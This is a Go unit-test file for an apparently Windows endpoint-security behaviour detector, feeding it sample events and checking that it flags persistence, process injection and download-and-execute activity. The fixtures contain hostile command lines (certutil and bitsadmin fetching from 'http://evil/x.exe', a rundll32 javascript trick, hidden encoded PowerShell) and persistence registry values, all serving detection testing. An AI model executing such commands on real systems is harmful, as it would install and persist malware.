package detector

import (
	"strings"
	"testing"

	"github.com/mihanistudio/mihanisecurity/internal/events"
)

func behaviorEvent(kind events.EventKind, proc *events.Process, reg *events.RegistryOp) events.Event {
	return events.Event{
		ID:       "test",
		Kind:     kind,
		Process:  proc,
		Registry: reg,
		Path:     "C:\\test\\payload.exe",
	}
}

func TestBehaviorPersistenceRunKey(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventRegistrySet, nil, &events.RegistryOp{
		Key:   `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		Value: "Updater",
		Data:  `powershell -enc AAAA`,
	}))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict, got %d", len(vs))
	}
	v := vs[0]
	if v.Threat != events.ThreatPersistence {
		t.Fatalf("expected persistence threat, got %s", v.Threat)
	}
	if v.Severity != events.SeverityHigh {
		t.Fatalf("expected high severity, got %s", v.Severity)
	}
	found := false
	for _, e := range v.Evidence {
		if len(e) > 0 && e[:4] == "key=" && strings.Contains(e, "CurrentVersion\\Run") {
			found = true
		}
	}
	if !found {
		t.Fatalf("Run key not in evidence: %v", v.Evidence)
	}
}

func TestBehaviorWinlogonShell(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventRegistrySet, nil, &events.RegistryOp{
		Key:   `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		Value: "Shell",
		Data:  `cmd.exe`,
	}))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatPersistence || vs[0].Severity != events.SeverityCritical {
		t.Fatalf("winlogon verdict wrong: %+v", vs[0])
	}
}

func TestBehaviorNoMatchOnUnrelatedRegistry(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventRegistrySet, nil, &events.RegistryOp{
		Key:   `HKCU\Software\Classes\jpegfile\shell\open\command`,
		Value: "Default",
	}))
	if len(vs) != 0 {
		t.Fatalf("expected no verdict, got %d", len(vs))
	}
}

func TestBehaviorSuspiciousCommandLine(t *testing.T) {
	d := NewBehavior()
	proc := &events.Process{Name: "powershell.exe", Path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell.exe -nop -w hidden -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
	vs := d.Evaluate(behaviorEvent(events.EventProcessStart, proc, nil))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatSuspicious {
		t.Fatalf("expected suspicious threat, got %s", vs[0].Threat)
	}
	if len(vs[0].Evidence) != 1 || vs[0].Evidence[0][:4] != "cmd=" {
		t.Fatalf("cmdline not in evidence: %v", vs[0].Evidence)
	}
}

func TestBehaviorEnabledToggleRespected(t *testing.T) {
	d := NewBehavior()
	proc := &events.Process{Name: "powershell.exe", Path: "C:\\x\\powershell.exe", CommandLine: "powershell.exe -nop -w hidden"}
	vs := d.Evaluate(behaviorEvent(events.EventProcessStart, proc, nil))
	if len(vs) == 0 {
		t.Fatalf("expected a verdict for hidden powershell")
	}
}

func TestBehaviorEncodedPowershell(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventProcessStart, &events.Process{
		Name: "powershell.exe", Path: "C:\\Windows\\System32\\powershell.exe",
		CommandLine: `powershell.exe -windowstyle hidden -encodedcommand SQBFAFgA`,
	}, nil))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict for encoded powershell, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatSuspicious || vs[0].Severity != events.SeverityHigh {
		t.Fatalf("encoded powershell verdict wrong: %+v", vs[0])
	}
}

func TestBehaviorScheduledTask(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventProcessStart, &events.Process{
		Name: "schtasks.exe", Path: "C:\\Windows\\System32\\schtasks.exe",
		CommandLine: `schtasks.exe /create /tn Updater /tr C:\Temp\x.exe /sc onlogon`,
	}, nil))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict for schtasks, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatPersistence {
		t.Fatalf("expected persistence threat, got %s", vs[0].Threat)
	}
}

func TestBehaviorDownloadExec(t *testing.T) {
	d := NewBehavior()
	for _, cmd := range []string{
		`certutil.exe -urlcache -split -f http://evil/x.exe %TEMP%\x.exe`,
		`bitsadmin.exe /transfer job /download http://evil/x.exe C:\Temp\x.exe`,
		`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";`,
	} {
		vs := d.Evaluate(behaviorEvent(events.EventProcessStart, &events.Process{
			Name: "cmd.exe", Path: "C:\\Windows\\System32\\cmd.exe", CommandLine: cmd,
		}, nil))
		if len(vs) == 0 {
			t.Fatalf("expected download-exec verdict for %q", cmd)
		}
	}
}

func TestBehaviorNoMatchOnBenignCommandLines(t *testing.T) {
	d := NewBehavior()
	for _, cmd := range []string{
		`C:\Windows\System32\notepad.exe C:\Temp\readme.txt`,
		`C:\Windows\System32\svchost.exe -k netsvcs`,
		`schtasks.exe /query /fo LIST`,
		`powershell.exe -Command Get-Process`,
	} {
		vs := d.Evaluate(behaviorEvent(events.EventProcessStart, &events.Process{
			Name: "x.exe", Path: "C:\\x\\x.exe", CommandLine: cmd,
		}, nil))
		if len(vs) != 0 {
			t.Fatalf("expected no verdict for %q, got %d", cmd, len(vs))
		}
	}
}

func TestBehaviorProcessInjection(t *testing.T) {
	d := NewBehavior()
	ev := behaviorEvent(events.EventThreadInject, &events.Process{
		PID: 1234, Name: "game.exe", Path: "C:\\Games\\game.exe",
	}, nil)
	ev.Access = "start=0x7ffd1234"
	vs := d.Evaluate(ev)
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict for unbacked thread, got %d", len(vs))
	}
	v := vs[0]
	if v.Threat != events.ThreatProcessInject {
		t.Fatalf("expected process_injection threat, got %s", v.Threat)
	}
	if v.Severity != events.SeverityHigh {
		t.Fatalf("expected high severity, got %s", v.Severity)
	}
	found := false
	for _, e := range v.Evidence {
		if len(e) >= 14 && e[:14] == "start_address=" {
			found = true
		}
	}
	if !found {
		t.Fatalf("start address not in evidence: %v", v.Evidence)
	}
}

func TestBehaviorProcessInjectionNoVerdictOnOtherEvents(t *testing.T) {
	d := NewBehavior()
	for _, kind := range []events.EventKind{
		events.EventProcessStart, events.EventModuleLoad, events.EventFileCreate,
	} {
		vs := d.Evaluate(behaviorEvent(kind, &events.Process{
			PID: 1234, Name: "x.exe", Path: "C:\\x\\x.exe",
		}, nil))
		for _, v := range vs {
			if v.Threat == events.ThreatProcessInject {
				t.Fatalf("unexpected process_injection verdict for %s", kind)
			}
		}
	}
}

func TestBehaviorIFEODebugger(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventRegistrySet, nil, &events.RegistryOp{
		Key:   `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe`,
		Value: "Debugger",
		Data:  `C:\evil\payload.exe`,
	}))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatPersistence || vs[0].Severity != events.SeverityCritical {
		t.Fatalf("unexpected verdict: %v", vs[0])
	}
}

func TestBehaviorAppInitDLLs(t *testing.T) {
	d := NewBehavior()
	vs := d.Evaluate(behaviorEvent(events.EventRegistrySet, nil, &events.RegistryOp{
		Key:   `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`,
		Value: "AppInit_DLLs",
		Data:  `C:\evil\hook.dll`,
	}))
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatPersistence || vs[0].Severity != events.SeverityCritical {
		t.Fatalf("unexpected verdict: %v", vs[0])
	}
}

func TestBehaviorStartupFolderPlant(t *testing.T) {
	d := NewBehavior()
	e := behaviorEvent(events.EventFileCreate, nil, nil)
	e.Path = `C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\stealer.exe`
	vs := d.Evaluate(e)
	if len(vs) != 1 {
		t.Fatalf("expected 1 verdict, got %d", len(vs))
	}
	if vs[0].Threat != events.ThreatPersistence {
		t.Fatalf("unexpected verdict: %v", vs[0])
	}
}
